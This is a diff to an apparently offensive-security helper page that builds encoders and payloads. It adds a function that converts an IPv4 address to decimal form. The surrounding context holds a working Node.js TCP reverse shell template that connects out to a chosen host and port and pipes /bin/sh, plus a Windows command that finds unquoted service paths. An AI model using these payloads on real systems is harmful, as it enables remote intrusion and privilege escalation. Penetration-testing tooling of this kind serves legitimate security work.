@@ -301,6 +301,7 @@ if (language) {
   <option value="Cmd: Check unquoted services">
   <option value="Decimal ASCII encoding">
   <option value="Decimal ASCII decoding">
+  <option value="IPv4 to decimal (int32)">
   <option value="Javascript TCP reverse shell">
   <option value="Morse code encoding">
   <option value="Morse code decoding">
@@ -342,6 +343,7 @@ $(function () {
   functions["Cmd: Check unquoted services"] = function (input) { return 'wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\Windows\\\\" | findstr /i /v """'; }
   functions["Decimal ASCII encoding"] = function (input) { function ascii_enc (a) { return a.charCodeAt(0); } return input.split('').map(ascii_enc); }
   functions["Decimal ASCII decoding"] = function (input) { function ascii_dec (a) { return String.fromCharCode(a); } return input.split(',').map(ascii_dec).join(''); }
+  functions["IPv4 to decimal (int32)"] = function (input) { var b32 = ''; input.split('.').map((value) => { b32 += ((+value).toString(2)).padStart(8,'0'); }); return parseInt(b32,2); } 
   functions["Javascript TCP reverse shell"] = function (input) { return apply_2args('(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(LPORT, "LHOST", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })();', "LHOST", "LPORT", input); }
   functions["Morse code encoding"] = function (input) { return MorseCode.encode(input); }
   functions["Morse code decoding"] = function (input) { return MorseCode.decode(input); }
